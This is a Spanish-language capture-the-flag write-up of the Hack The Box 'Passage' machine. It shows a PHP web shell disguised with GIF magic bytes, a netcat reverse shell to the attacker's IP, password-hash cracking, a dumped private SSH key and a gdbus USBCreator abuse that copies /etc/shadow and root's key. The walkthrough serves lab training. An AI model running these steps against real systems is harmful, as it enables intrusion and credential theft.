---
layout      : post
title       : "HackTheBox - Passage"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206banner.png
category    : [ htb ]
tags        : [ demon, cracking, magic-bytes, ssh-keys ]
---
Máquina Linux nivel medio. Explotaremos el servicio **CuteNews** para ejecutar comandos en el sistema, después jugaremos con hashes y crackeo. Jugaremos con llaves privadas y romperemos un proceso que se ejecuta con privilegios de administrador (**USBCreator**) para extraer archivos del sistema como usuario administrador.

![206passageHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206passageHTB.png)

### TL;DR (Spanish writeup)

**Creador**: [ChefByzen](https://www.hackthebox.eu/profile/140851).

Hola hola!

Empezaremos enumerando un servicio web, en el que no será necesario hacer fuerza bruta, simplemente abrir bien los ojos. Encontraremos una ruta hacia el servicio `CuteNews`, nos mirara a la cara un login y un área para registrarnos, despues de crear la cuenta obtendremos la versión del software, buscando en internet nos topamos con un `Arbitrary File Upload` del cual nos aprovecharemos jugando con los `Magic Bytes` para subir un archivo `PHP` y ejecutar comandos en el sistema remotamente. Enumerando obtenemos dos usuarios en el sistema: `paul` y `nadav`... Además en el directorio `CuteNews` encontraremos unos hashes, usaremos `hashcat` para crackearlos y obtener la contraseña del usuario `paul`.

Migraremos a `nadav` con la llave privada del mismo encontrada en el `/home` de `paul`

Para la escalada de privilegios encontraremos un proceso ejecutándose con privilegios de administrador (USBCreator), buscando en internet sobre él y exploits asociados, usando `gdbus` tenemos la capacidad de hacer uso de `USBCreator.Image` para (entre varios procesos) copiar archivos del sistema como el usuario `root`. Usaremos eso para extraer la llave privada (`id_rsa`) de él e ingresar como hicimos con el usuario `nadav` al sistema.

#### Clasificación de la máquina.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Tirando a real (:

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

### Fases

* [Enumeración](#enumeracion).
* [Movimiento lateral](#movimiento-lateral).
* [Explotación](#explotacion).
* [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Empezamos realizando un escaneo de puertos sobre la máquina para saber que servicios está corriendo.

```bash
–» nmap -p- --open -v 10.10.10.206 -oG initScan
```

En este caso fue rápido, así que no tuvimos que agregarle más argumentos para acelerar el proceso.

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Sun Dec 13 25:25:25 2020 as: nmap -p- --open -v -oG initScan 10.10.10.206
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.206 ()   Status: Up
Host: 10.10.10.206 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Sun Dec 13 25:25:25 2020 -- 1 IP address (1 host up) scanned in 161.87 seconds
```

Muy bien, tenemos los siguientes servicios:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Conexion remota segura mediante una shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto)**: Servidor web |

Hagamos nuestro escaneo de versiones y scripts con base en cada puerto, con ello obtenemos información más detallada de cada servicio:

```bash
–» nmap -p 22,80 -sC -sV 10.10.10.206 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan 
# Nmap 7.80 scan initiated Sun Dec 13 25:25:25 2020 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.206
Nmap scan report for 10.10.10.206
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 13 25:25:25 2020 -- 1 IP address (1 host up) scanned in 18.71 seconds
```

Tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 7.2p2 Ubuntu 4 |
| 80     | HTTP     | Apache httpd 2.4.18  |

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![206page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80.png)

Se nos presentan varias "noticias", en la que la inicial parece ser la más importante, veamos de que se trata:

![206page80_fail2ban_new](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80_fail2ban_new.png)

Han implementado en su web la herramienta [Fail2Ban](https://es.wikipedia.org/wiki/Fail2ban), básicamente para prevenir fuerza bruta sobre el servidor web (: baneando la IP por 2 minutos.

Si revisamos el código fuente, encontramos varias cosas interesantes:

![206page80_fail2banNew_sourcecode](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80_fail2banNew_sourcecode.png)

* Vemos una ruta nueva, `/CuteNews`.
* Usuarios con emails, `admin:nadav@passage.htb` y `paul:paul@passage.htb`.
* Posible inyección por medio de la URL, `/index.php?id=11`. Sigamos (:

Démosle a la ruta:

![206page80_cutenews](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80_cutenews.png)

Tenemos un login panel, con una versión `2.1.2` del gestor de noticias `CuteNews`.

* [Wikipedia de **CuteNews**](https://es.wikipedia.org/wiki/Cutenews).

Probando credenciales por default no obtenemos respuesta válida, también podemos registrarnos:

![206page80_cutenews_reg](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80_cutenews_reg.png)

Obtenemos:

![206page80_cutenews_logIN](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80_cutenews_logIN.png)

Buscando por internet existen varios exploits que se aprovechan de una opción que nos permite subir un avatar (imagen) a nuestro perfil para ejecutar comandos en el sistema. Por lo visto el gestor se guía por los [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) para validar el tipo de archivo. Así que si subimos un archivo `.php` así sin más, no nos lo va a dejar subir, pero si al archivo `.php` le agregamos al inicio la cadena `GIF 8;`, ahora interpretara que el tipo de archivo es un `GIF` (:

* [Me guie de este artículo, el cual explica detalladamente cada paso](https://musyokaian.medium.com/cutenews-2-1-2-remote-code-execution-vulnerability-450f29673194).

...

## Explotación [#](#explotacion) {#explotacion}

En el dashboard damos clic en `Personal option` y llegamos acá:

![206page80_cutenews_hereupavatar](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80_cutenews_hereupavatar.png)

Creamos archivo malicioso:

```bash
–» cat ejeje.php 
<?php $command=shell_exec($_REQUEST['xmd']); echo $command; ?>
–» file ejeje.php 
ejeje.php: PHP script, ASCII text
```

Modificamos los `magic bytes`:

```bash
–» cat ejeje.php 
GIF8;
<?php $command=shell_exec($_REQUEST['xmd']); echo $command; ?>
–» file ejeje.php 
ejeje.php: GIF image data 16188 x 26736
```

Subimos y guardamos cambios:

![206page80_cutenews_upavatardone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80_cutenews_upavatardone.png)

Los avatars quedan guardados en la ruta `/uploads`:

![206page80_cutenews_uploadsroute](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80_cutenews_uploadsroute.png)

![206page80_cutenews_rcewithavatar](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80_cutenews_rcewithavatar.png)

Perfecto, tenemos ejecución de comandos remotamente, generemos una reverse shell (: Pongamonos en escucha y despues hacemos la petición:

```bash
–» rlwrap nc -nlvp 4433
listening on [any] 4433 ...
```

```html
http://10.10.10.206/CuteNews/uploads/avatar_lanz_ejeje.php?xmd=nc 10.10.14.142 4433 -e /bin/bash
```

```bash
connect to [10.10.14.142] from (UNKNOWN) [10.10.10.206] 39636
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -c bash
Script started, file is /dev/null
www-data@passage:/var/www/html/CuteNews/uploads$ ls
ls
avatar_lanz_ejeje.php
www-data@passage:/var/www/html/CuteNews/uploads$ 
```

Listos, ahora a enumerar (:

* En la maquina tenemos dos usuarios: `paul` y `nadav`.

```bash
www-data@passage:/var/www/html/CuteNews/cdata/users$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 Jul 21 10:43 .
drwxr-xr-x 23 root  root  4096 Jul 21 10:44 ..
drwxr-x--- 17 nadav nadav 4096 Dec 13 14:11 nadav
drwxr-x--- 16 paul  paul  4096 Sep  2 07:18 paul
www-data@passage:/var/www/html/CuteNews/cdata/users$ ls /home/nadav
ls /home/nadav
ls: cannot open directory '/home/nadav': Permission denied
www-data@passage:/var/www/html/CuteNews/cdata/users$ ls /home/paul
ls /home/paul
ls: cannot open directory '/home/paul': Permission denied
www-data@passage:/var/www/html/CuteNews/cdata/users$
```

...

En los archivos que tenemos sobre la ruta `/CuteNews` nos encontramos con `/cdata/users/lines`:

![206page80_cutenews_linesfile](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206page80_cutenews_linesfile.png)

Tenemos cadenas en formato `base64`, pasémoslas a texto legible, podemos crear un script sencillo que nos haga la tarea:

```bash
–» cat extractusers.sh 
#!/bin/bash

url="http://10.10.10.206/CuteNews/cdata/users/lines"

#Hay otras lineas en formato php, pero las que nos interesan son las que empiezan con Y.
curl -s $url | grep -E "^Y" > hashes.txt

while read -r line; do
  #Decodeamos y mostramos
  echo "$line" | base64 -d ; echo; echo
done < hashes.txt

rm -r hashes.txt
```

```json
–» ./extractusers.sh 
a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}

a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}

a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}

a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}

a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}

a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}

a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}

a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}

a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}

a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}

a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}

a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}
```

Vemos usuario, email y pass (password supongo). Tomemos las passwords, que son hashes en formato SHA-256 y guardémoslas en un archivo, para posteriormente apoyarnos de `hashcat` y crackearlos:

```bash
–» cat hashes
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
```

```bash
–» hashcat -m 1400 -a 0 hashes -o result /usr/share/wordlists/rockyou.txt
–» cat result 
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
```

Perfecto, si usamos esa contraseña para movernos al usuario `paul` logramos obtener su sesión:

```bash
www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
su paul
Password: atlanta1

paul@passage:/var/www/html/CuteNews/cdata/users$ cd
cd
paul@passage:~$ ls
ls
Desktop    Downloads         Music     Public     user.txt
Documents  examples.desktop  Pictures  Templates  Videos
```

Ahora puedo pensar que debemos migrar al usuario `nadav`... A darle.

...

## Movimiento lateral [#](#movimiento-lateral) {#movimiento-lateral}

En nuestro `/home` tenemos archivos `SSH`, si miramos detenidamente que llaves tienen permitido el acceso, tenemos:

```bash
paul@passage:~/.ssh$ ls -la                                                                     
ls -la                                                                                          
total 24                                                                                        
drwxr-xr-x  2 paul paul 4096 Jul 21 10:43 .                                                     
drwxr-x--- 16 paul paul 4096 Sep  2 07:18 ..                                                    
-rw-r--r--  1 paul paul  395 Jul 21 10:43 authorized_keys       
-rw-------  1 paul paul 1679 Jul 21 10:43 id_rsa                
-rw-r--r--  1 paul paul  395 Jul 21 10:43 id_rsa.pub            
-rw-r--r--  1 paul paul 1312 Jul 21 10:44 known_hosts           
```

```bash
paul@passage:~/.ssh$ cat authorized_keys                                                        
cat authorized_keys                                                                             
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```

```bash
paul@passage:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
-----END RSA PRIVATE KEY-----
paul@passage:~/.ssh$ 
```

Obtenemos una llave privada, guardemosla en un archivo e intentemos ingresar a la máquina mediante `SSH`:

```bash
–» cat keynadav 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
...
```

```bash
#Le damos los permisos que requiere una llave privada SSH
–» chmod 700 keynadav
#Ingresamos
–» ssh -i keynadav nadav@10.10.10.206
The authenticity of host '10.10.10.206 (10.10.10.206)' can't be established.
ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.206' (ECDSA) to the list of known hosts.
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
...
...
nadav@passage:~$  
```

Listos, somos `nadav`, sigamos enumerando y veamos como convertirnos en usuario administrador...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Después de enumeración básica con scripts, dejar pasar cosas y enredarme con otras, no encontré nada útil, simplemente que hay un servicio llamado `CUPS` corriendo localmente en el puerto `631`... Pero esto fue un lindo rabbit hole en el que perdí un buen rato :(

Realizando un escaneo de procesos corriendo en la máquina, notamos que hay uno ejecutándose con privilegios de administrador:

```bash
nadav@passage:~$ ps aux
...
root      35653  0.0  0.5 235544 20112 ?        Sl   15:48   0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
nadav     35999  0.0  0.0  44404  3032 pts/23   R+   16:45   0:00 ps aux
```

Buscando en internet `usb-creator exploit` nos encontramos un lindo artículo en el que se explica el funcionamiento de USBCreator y D-Bus, en el sistema. Básicamente la vulnerabilidad consiste en que podemos sobreescribir archivos del sistema y todo con el usuario `root` sin necesidad de contraseña.

> A system bus, which is mainly used by privileged services to expose system-wide relevant services, and one session bus for each logged in user, which exposes services that are only relevant to that specific user. [PaloAltoNetworks](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

* [Artículo explicando funcionamiento de D-Bus y la vulnerabilidad en **com.ubuntu.USBCreator**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

> Recomiendo mucho leer el artículo :)

La vulnerabilidad se da por una herramienta de **Unix** (`dd`), la cual es usada por `USBCreator`. Que es la que nos permite copiar archivos. Intentemos copiarnos el archivo `/etc/shadow`.

```bash
nadav@passage:/dev/shm$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /etc/shadow /dev/shm/shadow true
()
nadav@passage:/dev/shm$ ls | grep shadow
shadow
nadav@passage:/dev/shm$
```

```bash
nadav@passage:/dev/shm$ cat shadow                                                              
root:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::
...
nadav:$6$D30IVulR$vENayGqKX8L0RYB/wcf7ZMfFHyCedmEIu4zXw7bZcH3GBrCrBzHJ3Y/in96pthdcp5cU.0UTXobQLu7T0INzk1:18464:0:99999:7:::
paul:$6$cpGlwRS2$AhcQyxAskjvAQtS4vpO0VgNW0liHRbLSosZlrHpzL3XTfPHmeDL7hWkut1kCjgNnEHIdU9J019hQTAMH6nzxe1:18464:0:99999:7:::
```

Perfecto, pues copiemos el `id_rsa` del usuario `root` para posteriormente obtener una Shell ingresando con su llave privada, lo mismo que hicimos con `nadav`.

```bash
nadav@passage:/dev/shm$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/paentrar true
()
```

![206bash_nadav_idRSAroot](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206bash_nadav_idRSAroot.png)

La guardamos en `keyroot` y entramos :)

```bash
–» ssh -i keyroot root@10.10.10.206
Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
root@passage:~# id    
uid=0(root) gid=0(root) groups=0(root)
root@passage:~# 
```

Perfecto, perfecto... Solo nos queda ver las flags :)

![206flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/passage/206flags.png)

...

El rabbit hole que me comí fue interesante (por lo menos recordé como hacer `Remote Port Forwarding`). Pensé de más en la escalada de privilegios, pero estuvo bien. Me gusto mucho el tema de las llaves `SSH`. Y nada... Nos encontraremos en otro writeup y a seguir rompiendo todo, muchas gracias a [@ChefByzen](https://www.hackthebox.eu/profile/140851) por la máquina y a ustedes por leer :)